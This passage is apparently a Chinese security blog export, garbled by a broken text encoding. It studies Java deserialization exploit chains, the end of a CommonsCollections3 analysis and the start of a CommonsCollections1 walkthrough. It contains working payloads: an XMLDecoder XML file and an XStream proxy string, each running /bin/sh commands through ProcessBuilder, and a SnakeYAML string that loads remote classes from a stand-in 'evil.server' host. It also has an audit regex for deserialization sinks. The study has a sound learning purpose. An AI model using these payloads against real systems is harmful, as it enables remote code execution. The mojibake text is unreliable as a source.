è¿™é‡Œæ¡†äº†ä¸¤ä¸ªæ¡†ï¼Œç¬¬ä¸€ä¸ªæ¡†æ˜¯é€šè¿‡javassistæ³¨å…¥é™æ€å—ï¼Œé™æ€å—çš„å†…å®¹å°±æ˜¯æˆ‘ä»¬éœ€è¦æ‰§è¡Œçš„å‘½ä»¤ã€‚ç¬¬äºŒä¸ªæ¡†æ˜¯ysoserailæ¡†æ¶è‡ªå·±å°è£…çš„ä¸€ä¸ªåå°„å·¥å…·ç±»ï¼Œé€šè¿‡è¿™ä¸ªç±»æˆ‘ä»¬å¯ä»¥åŠ¨æ€çš„æ“ä½œtemplateså®ä¾‹çš„ç±»å±æ€§å†…å®¹ã€‚è¿™é‡Œä¸»è¦å°±æ˜¯åœ¨æ»¡è¶³ä¸Šè¿°çš„å‡ ä¸ªæ¡ä»¶ã€‚ è¿™é‡Œæœ‰ä¸€ç‚¹å¯ä»¥æä¸€ä¸‹ï¼Œè¯¥åˆ©ç”¨é“¾çš„ä½œè€…åœ¨å¡«å……_bytecodesæ—¶ï¼Œé¢å¤–å¡«å……äº†ä¸€ä¸ªæ— å…³çš„ç±»(ä¸Šå›¾ç¬¬130è¡Œ)ã€‚è¿™ä¸ªç±»ä¸»è¦ç”¨äºæ»¡è¶³_auxClasses,è®©è¿™ä¸ªgetTransletInstanceå‡½æ•°èƒ½æ­£å¸¸èµ°å®Œã€‚ ç»è¿‡ä¸Šé¢çš„åˆ†æï¼Œå…¶å®æˆ‘ä»¬å¯ä»¥çŸ¥é“getTransletInstanceçš„ç¬¬408è¡Œï¼Œå¯¹_classåšå®ä¾‹åŒ–æ—¶æˆ‘ä»¬æƒ³è¦æ‰§è¡Œçš„ä»£ç å°±å·²ç»æ‰§è¡Œäº†ã€‚æ‰€ä»¥è¿™é‡Œé¢å¤–å¡«å……çš„ç±»å…¶å®æ˜¯å¯æœ‰å¯æ— çš„ã€‚ 0x04 æ€»ç»“åˆ°è¿™é‡Œï¼Œæ•´ä¸€ä¸ªCommonsCollections3å°±åˆ†æç»“æŸäº†ã€‚ CommonsCollections3ä¸»è¦åˆ©ç”¨äº†å¯æ§çš„byteæ•°ç»„ä»defineClasså‡½æ•°ä¸­è¿˜åŸå‡ºæ¶æ„æ„é€ çš„Classã€‚å¹¶ä¸”åœ¨åç»­çš„è°ƒç”¨ä¸­ï¼Œè¿™ä¸ªClassè¢«æ³¨å…¥åˆ°å†…å­˜ä¸­ï¼Œä»è€Œæ‰§è¡Œäº†æ³¨å…¥çš„é™æ€å—çš„ä»£ç ï¼Œå®ç°äº†ä»»æ„Javaä»£ç æ‰§è¡Œã€‚ åˆ°è¿™ç¯‡ä¸ºæ­¢ï¼Œæˆ‘ä»¬å·²ç»çŸ¥é“äº†ä¸¤ç§Javaçš„ä»»æ„ä»£ç æ‰§è¡Œçš„æ„é€ æ–¹å¼ åˆ©ç”¨å¯æ§çš„åå°„æœºåˆ¶ã€‚å…·ä½“çš„Classã€Methodç­‰å‡å¯æ§æ—¶ï¼Œåˆ©ç”¨åå°„æœºåˆ¶ï¼Œå¯ä»¥æ„é€ å‡ºä»»æ„çš„ç±»è°ƒç”¨ã€ç±»å‡½æ•°è°ƒç”¨ åˆ©ç”¨å¯æ§çš„defineClasså‡½æ•°çš„byteæ•°ç»„ã€‚æ„é€ æ¶æ„çš„Classå­—èŠ‚ç æ•°ç»„ï¼Œå¸¸äºé™æ€å—æ³¨å…¥æ¶æ„ä»£ç  20191104 è¡¥å……å‰é¢çš„åˆ†æå¹¶æ²¡æœ‰æåˆ°3.2.2ç‰ˆæœ¬å‘ç”Ÿäº†å•¥äº‹ï¼Œå¯¼è‡´äº†åˆ©ç”¨é“¾çš„å¤±æ•ˆï¼Œè¿™é‡Œç®€å•æä¸€ä¸‹ 3.2.2ç‰ˆæœ¬å¯¹InvokerTransformerå¢åŠ äº†readObjectå‡½æ•°ï¼Œå¹¶ä¸”åšäº†æ˜¯å¦å…è®¸ååºåˆ—åŒ–çš„æ£€æŸ¥ï¼Œåœ¨FunctorUtils.checkUnsafeSerializationå‡½æ•°å†…ã€‚ è¿™é‡ŒUNSAFE_SERIALIZABLE_PROPERTYçš„å€¼é»˜è®¤ä¸ºfalseï¼Œå¦‚æœéœ€è¦ä¸ºtrueï¼Œéœ€è¦åœ¨è¿è¡Œæ—¶æŒ‡å®šã€‚ æ‰€ä»¥åœ¨ä½¿ç”¨InvokerTransformerä½œä¸ºååºåˆ—åŒ–åˆ©ç”¨é“¾çš„ä¸€éƒ¨åˆ†æ—¶ï¼Œä¼šthrowä¸€ä¸ªexceptionã€‚é™¤äº†InvokerTransformerç±»å¤–ï¼Œè¿˜æœ‰CloneTransformer, ForClosure, InstantiateFactory, InstantiateTransformer, InvokerTransformer,PrototypeCloneFactory, PrototypeSerializationFactory, WhileClosureã€‚æ‰€ä»¥åœ¨3.2.2ç‰ˆæœ¬ä»¥ä¸Šï¼ŒåŸºæœ¬ä¸Šåˆ©ç”¨é“¾éƒ½å·²ç»åºŸäº†ã€‚ å½“ç„¶ï¼Œè¿™ç§æ–¹æ³•æ²»æ ‡ä¸æ²»æœ¬ï¼Œå¦‚æœå¯ä»¥åœ¨è¿™äº›ç±»ä»¥å¤–ï¼Œæ„é€ ä¸€ä¸ªåˆ©ç”¨é“¾åŒæ ·å¯ä»¥è¾¾åˆ°å‰é¢çš„æ•ˆæœã€‚"},{"title":"Javaååºåˆ—åŒ–åˆ©ç”¨é“¾æŒ–æ˜ä¹‹CommonsCollections1","permalink":"http://blog.0kami.cn/2019/10/24/java/study-java-deserialized-commonscollections3-1/","text":"0x00 å‰è¨€ å‰æ®µæ—¶é—´åœ¨å¤ç°shiroååºåˆ—åŒ–æ¼æ´çš„è¿‡ç¨‹ä¸­ï¼Œå‘ç°æ— æ³•å¾ˆå¥½çš„ç†è§£CommonCollections4ä¸ºä»€ä¹ˆæ— æ³•æ‰§è¡Œå‘½ä»¤ï¼Œè¿˜æ˜¯ç¼ºå°‘Javaçš„ä¸€äº›åŸºç¡€çŸ¥è¯†ã€‚æ‰€ä»¥è¿™é‡Œå°±å…ˆåœä¸‹äº†å¤ç°æ¼æ´çš„è¿›ç¨‹ï¼Œå…ˆå°†åŸºç¡€æ‰“æ‰å®ï¼šï¼‰ã€‚è¿™ç¯‡æ–‡ç« å°†è®°å½•ï¼ŒJavaååºåˆ—åŒ–æ¼æ´çš„åŸç†ä»¥åŠæµ‹è¯•ç¯å¢ƒã€‚ å‚è€ƒæ–‡çŒ®éƒ½åµŒå…¥åœ¨æ–‡ä¸­ã€‚ 0x01 åŸºç¡€çŸ¥è¯†1. Javaä¸­çš„åºåˆ—åŒ–å’Œååºåˆ—åŒ–åºåˆ—åŒ–ï¼šä½¿ç”¨ObjectOutputStreamç±»çš„writeObjectå‡½æ•° 1public final void writeObject(Object x) throws IOException ååºåˆ—åŒ–ï¼šä½¿ç”¨ObjectInputStreamç±»çš„readObjectå‡½æ•° 1public final Object readObject() throws IOException, ClassNotFoundException æ”¯æŒåºåˆ—åŒ–çš„å¯¹è±¡å¿…é¡»æ»¡è¶³ï¼š å®ç°äº†java.io.Serializableæ¥å£ å½“å‰å¯¹è±¡çš„æ‰€æœ‰ç±»å±æ€§å¯åºåˆ—åŒ–ï¼Œå¦‚æœæœ‰ä¸€ä¸ªå±æ€§ä¸æƒ³æˆ–ä¸èƒ½è¢«åºåˆ—åŒ–ï¼Œåˆ™éœ€è¦æŒ‡å®štransientï¼Œä½¿å¾—è¯¥å±æ€§å°†ä¸ä¼šè¢«åºåˆ—åŒ– ä¸¾ä¸ªä¾‹å­(æ¥æºäºæ­¤å¤„) 123456789101112public class Employee implements java.io.Serializable&#123; public String name; public String address; public transient int SSN; public int number; public void mailCheck() &#123; System.out.println(\"Mailing a check to \" + name + \" \" + address); &#125;&#125; 1234567891011121314151617181920212223242526import java.io.*;public class SerializeDemo&#123; public static void main(String [] args) &#123; Employee e = new Employee(); e.name = \"Reyan Ali\"; e.address = \"Phokka Kuan, Ambehta Peer\"; e.SSN = 11122333; e.number = 101; try &#123; FileOutputStream fileOut = new FileOutputStream(\"/tmp/employee.ser\"); ObjectOutputStream out = new ObjectOutputStream(fileOut); out.writeObject(e); out.close(); fileOut.close(); System.out.printf(\"Serialized data is saved in /tmp/employee.ser\"); &#125;catch(IOException i) &#123; i.printStackTrace(); &#125; &#125;&#125; è¿è¡Œåï¼Œç”Ÿæˆemployee.ser æ ¹æ®åºåˆ—åŒ–è§„èŒƒï¼Œacedä»£è¡¨javaåºåˆ—åŒ–æ•°æ®çš„magic wordSTREAM_MAGIC,0005è¡¨ç¤ºç‰ˆæœ¬å·STREAM_VERSION,73è¡¨ç¤ºæ˜¯ä¸€ä¸ªå¯¹è±¡TC_OBJECT,72è¡¨ç¤ºè¿™ä¸ªå¯¹è±¡çš„æè¿°TC_CLASSDESC æ‰€ä»¥åœ¨æ—¥å¸¸æµ‹è¯•ä¸­ï¼Œå¦‚æœè§£å¼€ç±»ä¼¼Base64åï¼Œèµ·å§‹ä¸ºacedæ‰“å¤´ï¼Œå¯ä»¥å°è¯•ä½¿ç”¨ååºåˆ—åŒ–çš„payloadã€‚ åœ¨å¯¹å…¶åšå®Œåºåˆ—åŒ–æ“ä½œåï¼Œæˆ‘ä»¬åœ¨å¦ä¸€ä¸ªJVMä¸­æ¢å¤è¯¥å¯¹è±¡ï¼Œéœ€è¦ç”¨åˆ°ObjectInputStream 12345678910111213141516171819202122232425262728293031import java.io.*;public class DeserializeDemo&#123; public static void main(String [] args) &#123; Employee e = null; try &#123; FileInputStream fileIn = new FileInputStream(\"/tmp/employee.ser\"); ObjectInputStream in = new ObjectInputStream(fileIn); e = (Employee) in.readObject(); in.close(); fileIn.close(); &#125;catch(IOException i) &#123; i.printStackTrace(); return; &#125;catch(ClassNotFoundException c) &#123; System.out.println(\"Employee class not found\"); c.printStackTrace(); return; &#125; System.out.println(\"Deserialized Employee...\"); System.out.println(\"Name: \" + e.name); System.out.println(\"Address: \" + e.address); System.out.println(\"SSN: \" + e.SSN); System.out.println(\"Number: \" + e.number); &#125;&#125; readObjectå‡½æ•°ååºåˆ—åŒ–äº†ä¸Šé¢äº§ç”Ÿçš„äºŒè¿›åˆ¶æ•°æ®æµï¼Œç”Ÿæˆäº†åŸæœ‰çš„å¯¹è±¡æ•°æ®ç»“æ„ã€‚éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œç”±äºSSNä¸ºtransientï¼Œå…¶æ— æ³•åºåˆ—åŒ–ï¼Œæ‰€ä»¥è¿˜åŸåå…¶å€¼ä¸º0ã€‚ å¦‚æœåœ¨å¾…åºåˆ—åŒ–ç±»ä¸Šå®ç°äº†readObjectå‡½æ•°ï¼Œååºåˆ—åŒ–è¿‡ç¨‹ä¸­ä¼šè‡ªåŠ¨è°ƒç”¨è¯¥ç±»çš„readObjectå‡½æ•°ã€‚ ä¾‹å¦‚åœ¨Employeeç±»ä¸­æ·»åŠ å‡½æ•°readObject 1234private void readObject(ObjectInputStream in) throws Exception &#123; in.defaultReadObject(); System.out.println(\"Employee call readObject Function\");&#125; åœ¨ååºåˆ—åŒ–è¿‡ç¨‹ä¸­å°†è°ƒç”¨è¯¥å‡½æ•° 2. ååºåˆ—åŒ–è§¦å‘ç‚¹æ‰©å±•ä¸Šé¢å±•ç¤ºäº†åºåˆ—åŒ–å’Œååºåˆ—åŒ–çš„åŸç†ï¼Œå¹¶ä¸”ååºåˆ—åŒ–çš„è§¦å‘ç‚¹ä¸ºObjectInputStream.readObjectã€‚é‚£ä¹ˆé—®é¢˜æ¥äº†ï¼Œæ˜¯å¦Javaååºåˆ—åŒ–åªèƒ½ç”±è¯¥ç‚¹è§¦å‘ï¼Ÿç­”æ¡ˆå½“ç„¶æ˜¯å¦å®šçš„ã€‚ é™¤äº†ä¸Šé¢çš„æ–¹æ³•å¤–ï¼Œè¿˜æœ‰å¦‚ä¸‹å‡ ç§è§¦å‘æ–¹å¼ï¼š 1234567ObjectInputStream.readObject// æµè½¬åŒ–ä¸ºObjectObjectInputStream.readUnshared // æµè½¬åŒ–ä¸ºObjectXMLDecoder.readObject // è¯»å–xmlè½¬åŒ–ä¸ºObjectYaml.load// yamlå­—ç¬¦ä¸²è½¬ObjectXStream.fromXML// XStreamç”¨äºJava Objectä¸xmlç›¸äº’è½¬åŒ–ObjectMapper.readValue// jacksonä¸­çš„apiJSON.parseObject// fastjsonä¸­çš„api Note: å¯¹äºreadUnsharedå‡½æ•°ï¼Œå…¶ä¸readObjectå‡½æ•°çš„åŒºåˆ«æš‚æ—¶è¿˜æ²¡å¼„æ˜ç™½ï¼Œå¼•ç”¨ç½‘ä¸Šçš„è§£é‡Š readUnsharedæ–¹æ³•è¯»å–å¯¹è±¡ï¼Œä¸å…è®¸åç»­çš„readObjectå’ŒreadUnsharedè°ƒç”¨å¼•ç”¨è¿™æ¬¡è°ƒç”¨ååºåˆ—åŒ–å¾—åˆ°çš„å¯¹è±¡ï¼Œè€ŒreadObjectè¯»å–çš„å¯¹è±¡å¯ä»¥ã€‚ ä½†å…¶ååºåˆ—åŒ–è¿‡ç¨‹ä¸­ä»ç„¶å¯ä»¥è§¦å‘readObjectçš„è°ƒç”¨ï¼Œæœ‰å¾…å¼„æ¸…æ¥šã€‚ 3. æ‰©å±•è§¦å‘ç‚¹è¯•éªŒreadUnsharedå‡½æ•°çš„ä½¿ç”¨æ–¹å¼åŒreadObjectç±»ä¼¼ï¼Œè¿™é‡Œä¸å†å™è¿°ã€‚è¿™ä¸€å°èŠ‚ä¸»è¦è®²å„ç§è§¦å‘ç‚¹çš„åˆ©ç”¨æ–¹å¼ï¼Œä¸è®²å…·ä½“çš„åŸç†ã€‚åŸç†éƒ¨åˆ†ç•™åˆ°åé¢åˆ†æã€‚ a. XMLDecoder.readObject1234567891011public static void main(String[] args)&#123; String poc = \"poc.xml\"; try &#123; FileInputStream file = new FileInputStream(poc); XMLDecoder decoder = new XMLDecoder(file); decoder.readObject(); decoder.close(); &#125; catch (FileNotFoundException e) &#123; e.printStackTrace(); &#125;&#125; poc.xml 1234567891011121314151617&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;&lt;java&gt; &lt;object class=\"java.lang.ProcessBuilder\"&gt; &lt;array class=\"java.lang.String\" length=\"3\"&gt; &lt;void index=\"0\"&gt; &lt;string&gt;/bin/sh&lt;/string&gt; &lt;/void&gt; &lt;void index=\"1\"&gt; &lt;string&gt;-c&lt;/string&gt; &lt;/void&gt; &lt;void index=\"2\"&gt; &lt;string&gt;open /Applications/Calculator.app&lt;/string&gt; &lt;/void&gt; &lt;/array&gt; &lt;void method=\"start\"/&gt; &lt;/object&gt;&lt;/java&gt; æœ€ç»ˆå¯è§¦å‘å‘½ä»¤æ‰§è¡Œ b. Yaml.loadå‚è€ƒé“¾æ¥ï¼Œè¿™é‡Œæš‚æœªè¯•éªŒ æ·»åŠ SnakeYAMLåº“ 123456&lt;!-- https://mvnrepository.com/artifact/org.yaml/snakeyaml --&gt;&lt;dependency&gt; &lt;groupId&gt;org.yaml&lt;/groupId&gt; &lt;artifactId&gt;snakeyaml&lt;/artifactId&gt; &lt;version&gt;1.25&lt;/version&gt;&lt;/dependency&gt; 123456public static void main(String[] args) &#123; String yamlStr = \"!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader \" + \"[[!!java.net.URL [\\\"http://evil.server\\\"]]]]\"; Yaml yaml = new Yaml(); Object obj = yaml.load(yamlStr);&#125; è¿™é‡Œçš„yamlStrå¯ä»¥ç”¨https://github.com/mbechler/marshalsecç”Ÿæˆå±å®³æ›´å¤§çš„payload c. XStream.fromXMLå‚è€ƒé“¾æ¥ æ·»åŠ XStreamåº“ 12345&lt;dependency&gt; &lt;groupId&gt;com.thoughtworks.xstream&lt;/groupId&gt; &lt;artifactId&gt;xstream&lt;/artifactId&gt; &lt;version&gt;1.4.10&lt;/version&gt;&lt;/dependency&gt; 123456789101112131415161718192021public static void main(String[] args) &#123;// expGen(); String payload = \"&lt;sorted-set&gt;\\n\" + \" &lt;string&gt;foo&lt;/string&gt;\\n\" + \" &lt;dynamic-proxy&gt;\\n\" + \" &lt;interface&gt;java.lang.Comparable&lt;/interface&gt;\\n\" + \" &lt;handler class=\\\"java.beans.EventHandler\\\"&gt;\\n\" + \" &lt;target class=\\\"java.lang.ProcessBuilder\\\"&gt;\\n\" + \" &lt;command&gt;\\n\" + \" &lt;string&gt;/bin/sh&lt;/string&gt;\\n\" + \" &lt;string&gt;-c&lt;/string&gt;\\n\" + \" &lt;string&gt;open /System/Applications/Calculator.app&lt;/string&gt;\\n\" + \" &lt;/command&gt;\\n\" + \" &lt;/target&gt;\\n\" + \" &lt;action&gt;start&lt;/action&gt;\"+ \" &lt;/handler&gt;\\n\" + \" &lt;/dynamic-proxy&gt;\\n\" + \"&lt;/sorted-set&gt;\\n\"; XStream xStream = new XStream(); xStream.fromXML(payload); &#125; d. ä¸Šé¢çš„6å’Œ7ï¼Œç•™åˆ°åé¢åˆ†æ4. å°ç»“ä¸Šé¢ä¸¤èŠ‚ä»‹ç»äº†Javaååºåˆ—åŒ–çš„åŸç†ï¼Œå¹¶æ‰©å±•äº†ååºåˆ—åŒ–çš„è§¦å‘ç‚¹ã€‚åœ¨å®é™…çš„å®¡è®¡è¿‡ç¨‹ä¸­ï¼Œå¯ä»¥ç›´æ¥å…³æ³¨è¿™äº›å‡½æ•°çš„è°ƒç”¨ 1(readObject|readUnshared|load|fromXML|readValue|parseObject)\\s*\\( å½“ç„¶æœ‰äº›è¿˜éœ€è¦çœ‹æ˜¯å¦æ˜¯æœ‰æ¼æ´çš„ç‰ˆæœ¬ 0x02 ååºåˆ—åŒ–è¿‡ç¨‹ä¸Šé¢å¤§è‡´è®²è¯‰äº†åºåˆ—åŒ–å’Œååºåˆ—åŒ–çš„ä½¿ç”¨æ–¹æ³•ï¼Œæœ¬èŠ‚å°†è°ƒè¯•ä¸Šé¢çš„Employeeæ¡ˆä¾‹ï¼Œæ¥çœ‹çœ‹åœ¨ä»£ç å±‚é¢ååºåˆ—åŒ–è¿‡ç¨‹æ˜¯æ€ä¹ˆæ ·çš„ï¼ è¿™é‡Œä½¿ç”¨çš„æ˜¯ObjectInputStreamçš„ååºåˆ—åŒ–æ–¹æ³•readObjectå‡½æ•° å…¶å®æ•´ä¸€ä¸ªååºåˆ—åŒ–è¿‡ç¨‹æ€»ä½“æ¥è¯´åˆ†ä¸ºä¸¤æ­¥ï¼Œä»å­—ç¬¦ä¸²æµä¸­æ ¹æ®åºåˆ—åŒ–è§„æ ¼æå–å‡ºå¯èƒ½çš„ç±»ï¼Œç„¶åå°†è¯¥ç±»ä½¿ç”¨åå°„æœºåˆ¶æŸ¥æ‰¾æˆ–åˆ›å»ºä¸€ä¸ªå®ä¾‹ã€‚å…¶ä¸­ä¹Ÿä¼šæœ‰ä¸€äº›æ£€æŸ¥çš„è¿‡ç¨‹ï¼Œè¿™é‡Œä¾‹å­æ¯”è¾ƒç®€å•ï¼Œä¸å™è¿°ã€‚ æ¥çœ‹ä¸€ä¸‹æŸ¥æ‰¾æˆ–åˆ›å»ºçš„è¿‡ç¨‹ ObjectInputStream:readObject:417 è·Ÿè¿›ObjectInputStreamçš„readObjectç±»ï¼Œè¯¥å‡½æ•°ä½“ç°äº†æ•´ä¸ªååºåˆ—åŒ–çš„è¿‡ç¨‹ï¼Œå…¶ä¸­å…¶ä¸»è¦åŠŸèƒ½çš„æ˜¯readObject0å‡½æ•° ObjectInputStream:readObject0:1515 ä»æµä¸­è¯»å–å‡ºå½“å‰çš„ç±»å‹ï¼Œtc=115æ­¤æ—¶ä»£è¡¨Objectå¯¹è±¡ï¼Œä»è€Œè¿›å…¥readOrdinaryObject ObjectInputStream:readOrdinaryObject:2026 è¯¥å‡½æ•°ä¸»è¦åšäº†å®ä¾‹åŒ–å¯¹è±¡çš„å·¥ä½œï¼Œå…¶ä¸­2033è¡Œç”Ÿæˆçš„ObjectStreamClasså¯¹è±¡ï¼Œä¼šåˆ©ç”¨åå°„æœºåˆ¶å®ä¾‹åŒ–åºåˆ—åŒ–æµä¸­çš„å¯¹è±¡ã€‚2044è¡Œå®é™…çš„è·å–åˆ°è¯¥å¯¹è±¡ã€‚ å…³äºObjectStreamClassçš„åŠŸèƒ½ï¼Œå®ƒæ˜¯ç±»çš„åºåˆ—åŒ–æè¿°å™¨ï¼ŒåŒ…å«ç±»çš„åå­—å’Œåºåˆ—ç‰ˆæœ¬å·ã€‚ä½¿ç”¨å®ƒçš„lookupå‡½æ•°å¯ä»¥è½½å…¥æˆ–æ–°å»ºè¯¥ç±»ï¼Œä½†è¿™é‡Œå®é™…ä¸Šç”¨çš„æ˜¯newInstanceæ¥å®ä¾‹åŒ–å½“å‰çš„åºåˆ—åŒ–æè¿°å™¨ï¼Œå³äº§ç”Ÿå½“å‰æè¿°å™¨æŒ‡ä»£çš„ç±»ã€‚ Serializationâ€™s descriptor for classes. It contains the name and serialVersionUID of the class. The ObjectStreamClass for a specific class loaded in this Java VM can be found/created using the lookup method. å…¶ä¸­å‡½æ•°readClassDescå°†ä»åºåˆ—åŒ–æµä¸­æå–å‡ºç›¸å…³çš„ç±»ä¿¡æ¯ã€‚è¿™é‡Œå°±ç›´æ¥çœ‹åˆ©ç”¨åå°„æœºåˆ¶è·å–åˆ°ç±»çš„åœ°æ–¹ï¼Œä½äºObjectInputStream.resolveClassï¼Œä¸‹å›¾ä¸ºè°ƒç”¨é“¾ ObjectInputStream:resolveClass:677 è¿™é‡Œæå–äº†jvmä¸­å½“å‰è¿™ä¸ªæµä¸­çš„ç±»çš„Classå¯¹è±¡ï¼Œç”¨äºåç»­çš„newInstanceã€‚ æ­¤å¤„æ•´ä¸€ä¸ªåå°„å°±æ˜¯å…ˆé€šè¿‡Class.forNameè·å–åˆ°å½“å‰æè¿°å™¨æ‰€æŒ‡ä»£çš„ç±»çš„Classå¯¹è±¡ï¼Œåç»­ä¼šåœ¨initNonProxyæˆ–initProxyå‡½æ•°ä¸­å¤åˆ¶è¯¥Classå¯¹è±¡çš„ç›¸å…³ä¿¡æ¯(åŒ…æ‹¬ç›¸å…³å‡½æ•°)ï¼Œæœ€ååœ¨2044è¡Œå¤„ObjectStreamClass.newInstanceå®ä¾‹åŒ–è¯¥å¯¹è±¡ã€‚ åœ¨å®ä¾‹åŒ–åä¼šç”¨ObjectInputStream.readSerialDataå‡½æ•°å°†åºåˆ—åŒ–æµä¸­çš„ç›¸å…³æ•°æ®å¡«å……è¿›å®ä¾‹åŒ–åçš„å¯¹è±¡ä¸­æˆ–è°ƒç”¨å½“å‰ç±»æè¿°å™¨çš„readObjectå‡½æ•°ã€‚ ObjectInputStream:readSerialData:2149 è¿™é‡Œä¼šæ ¹æ®å½“å‰çš„ç±»æè¿°å™¨æ˜¯å¦å­˜åœ¨readObjectå‡½æ•°æ¥è‡ªåŠ¨è°ƒç”¨è¯¥å‡½æ•°ï¼Œæˆ–è€…æ˜¯å¡«å……åºåˆ—æµä¸­çš„fieldæ•°æ®ã€‚è¿™é‡Œçš„readObjectçš„è°ƒç”¨å¸¸ä¸ºåˆ©ç”¨é“¾çš„ä¸€éƒ¨åˆ†ï¼Œä¾‹å¦‚CommonsCollections1ä¸­çš„AnnotationInvocationHandlerï¼Œåæ–‡å°†åˆ†æè¯¥å‡½æ•°ã€‚ æ³¨æ„ï¼šç”±äºæˆ‘ä»¬ç”¨çš„æ˜¯Serializableæ¥å£ï¼Œæ‰€ä»¥ä¸Šè¿°å¹¶æœªæåŠä½¿ç”¨Externalizableæ¥å£çš„æƒ…å†µã€‚ åˆ°æ­¤ä¸ºæ­¢ï¼Œæœ€åè¿”å›çš„å¯¹è±¡å°±æ˜¯æœ€ç»ˆæˆ‘ä»¬å¾—åˆ°çš„åºåˆ—åŒ–å‰çš„å¯¹è±¡ã€‚ å°ç»“è¿™é‡Œå¼•ç”¨æµ…è°ˆJavaååºåˆ—åŒ–æ¼æ´ä¿®å¤æ–¹æ¡ˆ Javaç¨‹åºä¸­ç±»ObjectInputStreamçš„readObjectæ–¹æ³•è¢«ç”¨æ¥å°†æ•°æ®æµååºåˆ—åŒ–ä¸ºå¯¹è±¡ï¼Œå¦‚æœæµä¸­çš„å¯¹è±¡æ˜¯classï¼Œåˆ™å®ƒçš„ObjectStreamClassæè¿°ç¬¦ä¼šè¢«è¯»å–ï¼Œå¹¶è¿”å›ç›¸åº”çš„classå¯¹è±¡ï¼ŒObjectStreamClassåŒ…å«äº†ç±»çš„åç§°åŠserialVersionUIDã€‚ å¦‚æœç±»æè¿°ç¬¦æ˜¯åŠ¨æ€ä»£ç†ç±»ï¼Œåˆ™è°ƒç”¨resolveProxyClassæ–¹æ³•æ¥è·å–æœ¬åœ°ç±»ã€‚å¦‚æœä¸æ˜¯åŠ¨æ€ä»£ç†ç±»åˆ™è°ƒç”¨resolveClassæ–¹æ³•æ¥è·å–æœ¬åœ°ç±»ã€‚å¦‚æœæ— æ³•è§£æè¯¥ç±»ï¼Œåˆ™æŠ›å‡ºClassNotFoundExceptionå¼‚å¸¸ã€‚ å¦‚æœååºåˆ—åŒ–å¯¹è±¡ä¸æ˜¯Stringã€arrayã€enumç±»å‹ï¼ŒObjectStreamClassåŒ…å«çš„ç±»ä¼šåœ¨æœ¬åœ°è¢«æ£€ç´¢ï¼Œå¦‚æœè¿™ä¸ªæœ¬åœ°ç±»æ²¡æœ‰å®ç°java.io.Serializableæˆ–è€…externalizableæ¥å£ï¼Œåˆ™æŠ›å‡ºInvalidClassExceptionå¼‚å¸¸ã€‚å› ä¸ºåªæœ‰å®ç°äº†Serializableå’ŒExternalizableæ¥å£çš„ç±»çš„å¯¹è±¡æ‰èƒ½è¢«åºåˆ—åŒ–ã€‚ å‰é¢åˆ†æä¸­æåˆ°æœ€åä¼šè°ƒç”¨resolveClassè·å–ç±»çš„Classå¯¹è±¡ï¼Œè¿™æ˜¯ååºåˆ—åŒ–è¿‡ç¨‹ä¸­ä¸€ä¸ªé‡è¦çš„åœ°æ–¹ï¼Œä¹Ÿæ˜¯å¿…ç»ä¹‹è·¯ï¼Œæ‰€ä»¥æœ‰ç ”ç©¶äººå‘˜æå‡ºé€šè¿‡é‡è½½ObjectInputStreamçš„resolveClassæ¥é™åˆ¶å¯ä»¥è¢«ååºåˆ—åŒ–çš„ç±» 0x03 åˆ©ç”¨é“¾å‘æ˜åŒPHPçš„ååºåˆ—åŒ–ä¸€æ ·ï¼Œå•å•å‘ç°ååºåˆ—åŒ–çš„è§¦å‘ç‚¹å¹¶ä¸èƒ½é€ æˆä¸¥é‡çš„å½±å“ã€‚å¾€å¾€ååºåˆ—åŒ–æ¼æ´çš„å±å®³ç¨‹åº¦å–å†³äºåç»­çš„ååºåˆ—åŒ–åˆ©ç”¨é“¾æ‰€èƒ½è¾¾åˆ°çš„å±é™©ç¨‹åº¦ã€‚åœ¨javaä¸­ysoserialå·¥å…·ç»™æˆ‘ä»¬æä¾›äº†è®¸å¤šå¸¸è§çš„åº“å­˜åœ¨çš„åˆ©ç”¨é“¾ï¼Œè¿™ä¸€èŠ‚å°†é€ä¸€åˆ†æè¿™äº›åˆ©ç”¨é“¾ã€‚ 1. CommonsCollections1(jdk&lt;=7)å‚è€ƒé“¾æ¥ Apache Commons Collectionsæ˜¯ä¸€ä¸ªæ‰©å±•äº†Javaæ ‡å‡†åº“é‡Œçš„Collectionç»“æ„çš„ç¬¬ä¸‰æ–¹åŸºç¡€åº“ï¼Œå®ƒæä¾›äº†å¾ˆå¤šå¼ºæœ‰åŠ›çš„æ•°æ®ç»“æ„ç±»å‹å¹¶ä¸”å®ç°äº†å„ç§é›†åˆå·¥å…·ç±»ã€‚ä½œä¸ºApacheå¼€æºé¡¹ç›®çš„é‡è¦ç»„ä»¶ï¼ŒCommons Collectionsè¢«å¹¿æ³›åº”ç”¨äºå„ç§Javaåº”ç”¨çš„å¼€å‘ã€‚ CommonsCollection1çš„åˆ†ææ–‡ç« æ¯”è¾ƒå¤šï¼Œåˆšå¼€å§‹å…ˆä»è¿™ä¸ªgadgetå¼€å§‹åˆ†æã€‚è¿™é‡Œæˆ‘ç”¨çš„åˆ†ææ–¹æ³•æ˜¯å…ˆå†™ä¸€ä¸ªè§¦å‘ç‚¹ï¼Œç„¶åç”¨ysoserialç”Ÿæˆpayloadæ¥è°ƒè¯•ã€‚ CommonsCollections1 payloadé’ˆå¯¹çš„commons-collections 3.1ç‰ˆæœ¬ï¼Œå…ˆå¼•å…¥åº“ 123456&lt;!-- https://mvnrepository.com/artifact/commons-collections/commons-collections --&gt;&lt;dependency&gt; &lt;groupId&gt;commons-collections&lt;/groupId&gt; &lt;artifactId&gt;commons-collections&lt;/artifactId&gt; &lt;version&gt;3.1&lt;/version&gt;&lt;/dependency&gt; åœ¨ysoserialçš„expä¸­ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°ä¸€æ•´ä¸ªè°ƒç”¨çš„é“¾ æˆ‘ä»¬å¯ä»¥çœ‹åˆ°åˆ©ç”¨é“¾çš„æœ€åè°ƒç”¨äº†Runtime.getRuntime().exec()ï¼Œè¿™æ„å‘³ç€æˆ‘ä»¬éœ€è¦åœ¨å‰ä¸€æ­¥çš„é“¾ä¸Šå¯ä»¥è¾¾åˆ°è°ƒç”¨ä»»æ„ç±»å’Œæ–¹æ³•çš„å‡½æ•°ã€‚ CommonsCollections1ç”¨çš„å°±æ˜¯3.1ç‰ˆæœ¬ä¸‹çš„InvokerTransformer.transform() 1234567891011121314151617public Object transform(Object input) &#123; if (input == null) &#123; return null; &#125; try &#123; Class cls = input.getClass(); Method method = cls.getMethod(iMethodName, iParamTypes); return method.invoke(input, 